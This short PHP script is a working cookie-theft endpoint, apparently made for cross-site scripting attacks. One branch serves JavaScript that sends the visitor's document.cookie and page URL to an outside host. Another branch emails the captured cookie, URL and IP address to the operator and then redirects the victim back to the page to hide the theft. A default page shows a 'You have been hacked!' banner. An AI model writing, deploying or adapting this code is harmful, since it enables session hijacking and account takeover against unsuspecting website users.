<?php

require_once 'functions.php';

$type = $_GET["type"];

switch ($type) {
    case 'cookie':
        $cookie = $_GET["cookie"];
        $link = $_GET["link"];
        $ip = ip();
        $message = '<p>COOKIES: <b>' . $cookie . '</b></p><p>URL: <b>' . $link . '</b></p><p>' . $ip . '</p>';
        if (!(empty($cookie) && empty($link))) {
            mail_alert($message);
            header("Location: $link");
        }
        break;
    case 'cookie_script':
        echo 'window.location="https://cdn.lucacastelnuovo.nl/scripts/hacked?type=cookie&cookie="+document.cookie+"&link="+window.location.href';
        break;
}
?>
<!DOCTYPE html>
<html lang="nl">

<head>
    <meta charset="UTF-8">
    <title>You have been hacked!</title>
    <style>
        body {
            background: url('/images/hacked.gif') no-repeat center center fixed;
            background-size: cover;
            background-color: black;
        }

    </style>
</head>

<body>
</body>

</html>
